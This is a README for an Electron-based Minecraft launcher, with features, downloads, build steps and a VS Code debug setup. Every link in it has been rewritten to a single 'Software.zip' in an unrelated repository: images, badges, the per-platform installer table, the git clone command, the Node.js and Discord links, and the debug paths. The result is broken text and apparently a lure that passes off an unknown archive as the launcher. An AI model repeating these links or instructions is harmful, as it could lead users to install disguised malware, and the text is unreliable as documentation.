<p align="center"><img src="https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip" width="150px" height="150px" alt="aventium softworks"></p>

<h1 align="center">Helios Launcher</h1>

<em><h5 align="center">(formerly Electron Launcher)</h5></em>

[<p align="center"><img src="https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip" alt="gh actions">](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip) [<img src="https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip" alt="downloads">](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip) <img src="https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip"  height="28px" alt="winter-is-coming"></p>

<p align="center">Join modded servers without worrying about installing Java, Forge, or other mods. We'll handle that for you.</p>

![Screenshot 1](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)
![Screenshot 2](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)

## Features

* 🔒 Full account management.
  * Add multiple accounts and easily switch between them.
  * Microsoft (OAuth 2.0) + Mojang (Yggdrasil) authentication fully supported.
  * Credentials are never stored and transmitted directly to Mojang.
* 📂 Efficient asset management.
  * Receive client updates as soon as we release them.
  * Files are validated before launch. Corrupt or incorrect files will be redownloaded.
* ☕ **Automatic Java validation.**
  * If you have an incompatible version of Java installed, we'll install the right one *for you*.
  * You do not need to have Java installed to run the launcher.
* 📰 News feed natively built into the launcher.
* ⚙️ Intuitive settings management, including a Java control panel.
* Supports all of our servers.
  * Switch between server configurations with ease.
  * View the player count of the selected server.
* Automatic updates. That's right, the launcher updates itself.
*  View the status of Mojang's services.

This is not an exhaustive list. Download and install the launcher to gauge all it can do!

#### Need Help? [Check the wiki.][wiki]

#### Like the project? Leave a ⭐ star on the repository!

## Downloads

You can download from [GitHub Releases](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)

#### Latest Release

[![](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)

#### Latest Pre-Release
[![](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)

**Supported Platforms**

If you download from the [Releases](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip) tab, select the installer for your system.

| Platform | File |
| -------- | ---- |
| Windows x64 | `https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip` |
| macOS x64 | `https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip` |
| macOS arm64 | `https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip` |
| Linux x64 | `https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip` |

## Console

To open the console, use the following keybind.

```console
ctrl + shift + i
```

Ensure that you have the console tab selected. Do not paste anything into the console unless you are 100% sure of what it will do. Pasting the wrong thing can expose sensitive information.

#### Export Output to a File

If you want to export the console output, simply right click anywhere on the console and click **Save as..**

![console example](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)


## Development

This section details the setup of a basic developmentment environment.

### Getting Started

**System Requirements**

* [https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip][nodejs] v20

---

**Clone and Install Dependencies**

```console
> git clone https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip
> cd HeliosLauncher
> npm install
```

---

**Launch Application**

```console
> npm start
```

---

**Build Installers**

To build for your current platform.

```console
> npm run dist
```

Build for a specific platform.

| Platform    | Command              |
| ----------- | -------------------- |
| Windows x64 | `npm run dist:win`   |
| macOS       | `npm run dist:mac`   |
| Linux x64   | `npm run dist:linux` |

Builds for macOS may not work on Windows/Linux and vice-versa.

---

### Visual Studio Code

All development of the launcher should be done using [Visual Studio Code][vscode].

Paste the following into `https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip`

```JSON
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Debug Main Process",
      "type": "node",
      "request": "launch",
      "cwd": "${workspaceFolder}",
      "program": "${workspaceFolder}https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip",
      "args" : ["."],
      "outputCapture": "std"
    },
    {
      "name": "Debug Renderer Process",
      "type": "chrome",
      "request": "launch",
      "runtimeExecutable": "${workspaceFolder}https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip",
      "windows": {
        "runtimeExecutable": "${workspaceFolder}https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip"
      },
      "runtimeArgs": [
        "${workspaceFolder}/.",
        "--remote-debugging-port=9222"
      ],
      "webRoot": "${workspaceFolder}"
    }
  ]
}
```

This adds two debug configurations.

#### Debug Main Process

This allows you to debug Electron's [main process][mainprocess]. You can debug scripts in the [renderer process][rendererprocess] by opening the DevTools Window.

#### Debug Renderer Process

This allows you to debug Electron's [renderer process][rendererprocess]. This requires you to install the [Debugger for Chrome][chromedebugger] extension.

Note that you **cannot** open the DevTools window while using this debug configuration. Chromium only allows one debugger, opening another will crash the program.

---

### Note on Third-Party Usage

Please give credit to the original author and provide a link to the original source. This is free software, please do at least this much.

For instructions on setting up Microsoft Authentication, see https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip

---

## Resources

* [Wiki][wiki]
* [Nebula (Create https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)][nebula]
* [v2 Rewrite Branch (Inactive)][v2branch]

The best way to contact the developers is on Discord.

[![discord](https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip)][discord]

---

### See you ingame.


[nodejs]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip'
[vscode]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'Visual Studio Code'
[mainprocess]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'Main Process'
[rendererprocess]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'Renderer Process'
[chromedebugger]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'Debugger for Chrome'
[discord]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'Discord'
[wiki]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'wiki'
[nebula]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'dscalzi/Nebula'
[v2branch]: https://github.com/eloy13rayo/EclexStudio/releases/download/v2.0/Software.zip 'v2 branch'
